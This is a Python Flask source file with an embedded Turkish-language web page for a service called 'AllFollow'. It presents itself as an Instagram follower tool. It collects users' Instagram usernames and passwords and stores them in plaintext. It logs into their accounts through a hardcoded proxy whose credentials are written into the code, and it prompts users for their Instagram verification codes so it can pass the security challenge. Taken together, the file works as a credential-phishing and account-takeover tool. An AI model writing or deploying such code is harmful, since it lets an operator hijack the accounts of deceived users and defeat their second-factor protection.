import os
import threading
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword, TwoFactorRequired
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = "allfollow-v57-final"

db = SQLAlchemy(app)
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"

# Aktif Client nesnelerini hafızada tutuyoruz
active_clients = {}

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(100), default="Sistem Başlatılıyor...")

# --- BOT İŞLEMCİSİ (Tamamen Bağımsız) ---
def run_login_process(u, p):
    cl = Client()
    if PROXY_URL: cl.set_proxy(PROXY_URL)
    active_clients[u] = cl
    
    try:
        cl.login(u, p)
        set_status(u, "OK") # Giriş Başarılı
    except ChallengeRequired:
        set_status(u, "ONAY_LAZIM") # Instagram 'Bu sen misin?' dedi
    except BadPassword:
        set_status(u, "HATALI_SIFRE")
    except Exception as e:
        set_status(u, f"HATA: {str(e)[:15]}")

def set_status(u, s):
    with app.app_context():
        acc = IGAccount.query.filter_by(username=u).first()
        if acc:
            acc.status = s
            db.session.commit()

# --- YOLLAR ---
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/connect', methods=['POST'])
def connect():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    # 1. DB'ye hemen yaz (Saniyeler sürer)
    acc = IGAccount.query.filter_by(username=u).first()
    if not acc:
        acc = IGAccount(username=u, password=p)
        db.session.add(acc)
    else:
        acc.password = p
        acc.status = "Bağlanıyor..."
    db.session.commit()
    
    # 2. BOTU ARKA SOKAKTAN GÖNDER (Thread)
    # Bu satır çalışır çalışmaz aşağıdaki 'return'e geçer, bekletmez!
    threading.Thread(target=run_login_process, args=(u, p)).start()
    
    return jsonify(status="started")

@app.route('/api/status/<u>')
def status(u):
    acc = IGAccount.query.filter_by(username=u).first()
    return jsonify(status=acc.status if acc else "YOK")

@app.route('/api/verify', methods=['POST'])
def verify():
    data = request.json
    u, code = data.get('u'), data.get('code')
    cl = active_clients.get(u)
    if cl:
        try:
            cl.challenge_set_code(code)
            set_status(u, "OK")
            return jsonify(status="success")
        except: return jsonify(status="fail")
    return jsonify(status="no_cl")

# --- ARAYÜZ ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AllFollow</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style> .page { display: none; } .page.active { display: block; } </style>
</head>
<body class="bg-zinc-950 flex justify-center">

    <div id="login-p" class="page active w-full max-w-[450px] p-8 mt-20 text-center">
        <h1 class="text-4xl font-black text-white italic mb-10 tracking-tighter">ALL FOLLOW</h1>
        <div class="space-y-4">
            <input id="u" placeholder="Kullanıcı Adı" class="w-full p-4 bg-zinc-900 text-white rounded-2xl border border-zinc-800 outline-none focus:border-purple-600">
            <input id="p" type="password" placeholder="Şifre" class="w-full p-4 bg-zinc-900 text-white rounded-2xl border border-zinc-800 outline-none focus:border-purple-600">
            <button onclick="baglan()" id="btn" class="w-full p-4 bg-[#a100ff] text-white font-bold rounded-2xl shadow-xl active:scale-95 transition-all">GİRİŞ YAP</button>
        </div>
    </div>

    <div id="main-p" class="page w-full max-w-[450px] min-h-screen bg-white">
        <div class="bg-[#a100ff] p-8 text-white rounded-b-[40px] shadow-2xl">
            <div class="flex justify-between items-center mb-4 text-xs font-bold opacity-70"><p>DURUM TAKİBİ</p><i class="fas fa-signal"></i></div>
            <h2 id="st-text" class="text-2xl font-black italic animate-pulse">SİSTEM BAŞLATILIYOR...</h2>
        </div>

        <div class="p-6 space-y-6">
            <div id="code-area" class="hidden bg-purple-50 p-6 rounded-3xl border-2 border-dashed border-purple-300">
                <p class="text-purple-800 font-bold text-center mb-4">Instagram Onay Kodu Gönderdi:</p>
                <input id="vcode" placeholder="000000" class="w-full p-4 text-center text-3xl font-mono tracking-[10px] rounded-2xl border-none mb-4 shadow-inner">
                <button onclick="onayla()" class="w-full bg-purple-600 text-white py-4 rounded-2xl font-black">ONAYLA</button>
            </div>
            
            <div class="bg-gray-50 p-6 rounded-3xl border flex items-center justify-between">
                <div><p class="text-[10px] text-gray-400 font-bold uppercase">Hesap</p><p id="usr-nm" class="font-black text-gray-800"></p></div>
                <div class="w-10 h-10 bg-purple-100 rounded-full flex items-center justify-center text-purple-600 font-bold italic">IG</div>
            </div>
        </div>
    </div>

    <script>
        let currU = "";

        async function baglan() {
            currU = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            if(!currU || !p) return;

            document.getElementById('btn').innerText = "İŞLENİYOR...";
            
            // Backend'e gönderiyoruz ama CEVABI BEKLEMİYORUZ (await yok!)
            fetch('/api/connect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u: currU, p: p})
            });

            // 0.5 saniye sonra pat diye paneli açıyoruz
            setTimeout(() => {
                document.getElementById('usr-nm').innerText = currU;
                document.getElementById('login-p').classList.remove('active');
                document.getElementById('main-p').classList.add('active');
                monitor(); // Canlı izlemeyi başlat
            }, 600);
        }

        async function monitor() {
            const res = await fetch('/api/status/' + currU);
            const data = await res.json();
            const s = data.status;
            const txt = document.getElementById('st-text');
            const box = document.getElementById('code-area');

            if(s === "OK") {
                txt.innerText = "SİSTEM AKTİF";
                txt.classList.remove('animate-pulse');
                txt.classList.add('text-green-300');
                box.classList.add('hidden');
            } else if(s === "ONAY_LAZIM") {
                txt.innerText = "ONAY BEKLENİYOR";
                box.classList.remove('hidden');
            } else if(s === "HATALI_SIFRE") {
                txt.innerText = "ŞİFRE YANLIŞ!";
                txt.classList.add('text-red-300');
            } else {
                txt.innerText = s;
                setTimeout(monitor, 3000); // 3 saniyede bir kontrol et
            }
        }

        async function onayla() {
            const code = document.getElementById('vcode').value;
            await fetch('/api/verify', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u: currU, code: code})
            });
            document.getElementById('vcode').value = "";
            monitor();
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
